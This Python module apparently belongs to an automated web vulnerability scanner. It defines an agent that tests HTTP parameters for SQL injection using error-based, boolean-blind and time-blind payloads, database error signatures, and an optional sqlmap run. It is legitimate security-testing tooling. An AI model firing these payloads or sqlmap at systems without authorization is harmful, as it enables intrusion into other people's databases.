"""SQL injection agent: tries error-based, boolean-blind, and time-blind
confirmation before ever reporting a finding. Falls back to sqlmap for a
deeper pass only when it's installed and the operator has explicitly
disabled the safe-by-default guard (CONFIRM_DESTRUCTIVE=false in .env) --
sqlmap can be a heavy, noisy tool and shouldn't fire without that opt-in.
"""
from __future__ import annotations

import asyncio
import shutil
import subprocess
import time

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent
from noctis.agents.targeting import apply_payload, baseline_request

ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query():",
    "postgresql query failed",
    "sqlite3.operationalerror",
    "ora-01756",
    "ora-00933",
    "syntax error at or near",
    "warning: mysql",
    "native client error",
]

BOOLEAN_TRUE = ["' OR '1'='1", " OR 1=1", '" OR "1"="1']
BOOLEAN_FALSE = ["' AND '1'='2", " AND 1=2", '" AND "1"="2']
ERROR_PROBE = "'"
TIME_PAYLOADS = [
    ("' OR SLEEP(5)-- -", 5),
    (" OR SLEEP(5)", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("' OR pg_sleep(5)-- -", 5),
]
TIME_THRESHOLD_SECONDS = 4.5


class SQLiAgent(HttpAgent):
    agent_type = "sqli"

    async def run(self) -> AgentResult:
        if self.target is None or not self.target.param_names:
            return self.no_target_result()

        baseline_url, baseline_body = baseline_request(self.target)
        try:
            baseline_start = time.monotonic()
            baseline = await self.client.request(
                self.target.method, baseline_url, data=baseline_body
            )
            baseline_elapsed = time.monotonic() - baseline_start
        except Exception as exc:
            return AgentResult(found=False, notes=f"baseline request failed: {exc}")

        for param in self.target.param_names:
            result = await self._error_based(param)
            if result:
                return result
            result = await self._boolean_based(param, baseline)
            if result:
                return result
            result = await self._time_based(param, baseline_elapsed)
            if result:
                return result

        return AgentResult(found=False, notes=f"no SQLi confirmed across {len(self.target.param_names)} param(s)")

    async def _error_based(self, param: str) -> AgentResult | None:
        url, body = apply_payload(self.target, param, ERROR_PROBE)
        response = await self.client.request(self.target.method, url, data=body)
        matched = self._matched_error(response.text)
        if not matched:
            return None

        async def recheck() -> bool:
            r = await self.client.request(self.target.method, url, data=body)
            return self._matched_error(r.text) is not None

        self._recheck = recheck
        return AgentResult(
            found=True,
            payload=ERROR_PROBE,
            request=self._format_request(self.target.method, url, body),
            response=self._format_response(response),
            evidence=f"database error signature '{matched}' returned for param '{param}'",
            poc_request=self._poc_request(self.target.method, url, body),
        )

    async def _boolean_based(self, param: str, baseline) -> AgentResult | None:
        for true_payload, false_payload in zip(BOOLEAN_TRUE, BOOLEAN_FALSE):
            true_url, true_body = apply_payload(self.target, param, true_payload)
            false_url, false_body = apply_payload(self.target, param, false_payload)
            true_resp = await self.client.request(self.target.method, true_url, data=true_body)
            false_resp = await self.client.request(self.target.method, false_url, data=false_body)

            true_len, false_len, base_len = len(true_resp.text), len(false_resp.text), len(baseline.text)
            true_matches_baseline = _similar_length(true_len, base_len)
            false_differs = not _similar_length(false_len, base_len) or not _similar_length(false_len, true_len)

            if true_resp.status_code == baseline.status_code and true_matches_baseline and false_differs:
                async def recheck(tu=true_url, tb=true_body, fu=false_url, fb=false_body, bl=base_len) -> bool:
                    t = await self.client.request(self.target.method, tu, data=tb)
                    f = await self.client.request(self.target.method, fu, data=fb)
                    return _similar_length(len(t.text), bl) and not _similar_length(len(f.text), bl)

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=f"TRUE={true_payload!r} FALSE={false_payload!r}",
                    request=self._format_request(self.target.method, true_url, true_body),
                    response=self._format_response(true_resp),
                    evidence=(
                        f"boolean-blind SQLi on param '{param}': TRUE response matches baseline "
                        f"length ({true_len} vs {base_len}), FALSE response diverges ({false_len})"
                    ),
                    poc_request=self._poc_request(self.target.method, true_url, true_body),
                )
        return None

    async def _time_based(self, param: str, baseline_elapsed: float) -> AgentResult | None:
        if baseline_elapsed > 2.0:
            return None  # target is already slow; timing signal would be unreliable
        for payload, delay in TIME_PAYLOADS:
            url, body = apply_payload(self.target, param, payload)
            start = time.monotonic()
            response = await self.client.request(self.target.method, url, data=body)
            elapsed = time.monotonic() - start
            if elapsed >= TIME_THRESHOLD_SECONDS:
                async def recheck(u=url, b=body) -> bool:
                    s = time.monotonic()
                    await self.client.request(self.target.method, u, data=b)
                    return (time.monotonic() - s) >= TIME_THRESHOLD_SECONDS

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=payload,
                    request=self._format_request(self.target.method, url, body),
                    response=self._format_response(response),
                    evidence=f"time-blind SQLi on param '{param}': response took {elapsed:.1f}s for a {delay}s sleep payload",
                    poc_request=self._poc_request(self.target.method, url, body),
                )
        return None

    @staticmethod
    def _matched_error(text: str) -> str | None:
        lowered = text.lower()
        for sig in ERROR_SIGNATURES:
            if sig in lowered:
                return sig
        return None

    async def report(self, result: AgentResult) -> AgentResult:
        if not result.found or self.context.settings.confirm_destructive or not shutil.which("sqlmap"):
            return result
        sqlmap_summary = await asyncio.to_thread(self._run_sqlmap)
        if sqlmap_summary:
            result.evidence = f"{result.evidence}\n\nsqlmap: {sqlmap_summary}"
        return result

    def _run_sqlmap(self) -> str | None:
        if self.target is None:
            return None
        try:
            proc = subprocess.run(
                [
                    "sqlmap", "-u", self.target.url, "--batch", "--risk=1", "--level=1",
                    "--timeout=15", "--retries=1",
                ],
                capture_output=True, text=True, timeout=120,
            )
        except (OSError, subprocess.TimeoutExpired) as exc:
            return f"sqlmap run failed: {exc}"
        output = proc.stdout[-1000:]
        return output if "parameter" in output.lower() and "injectable" in output.lower() else None


def _similar_length(a: int, b: int, tolerance: float = 0.05) -> bool:
    if b == 0:
        return a == 0
    return abs(a - b) / b <= tolerance
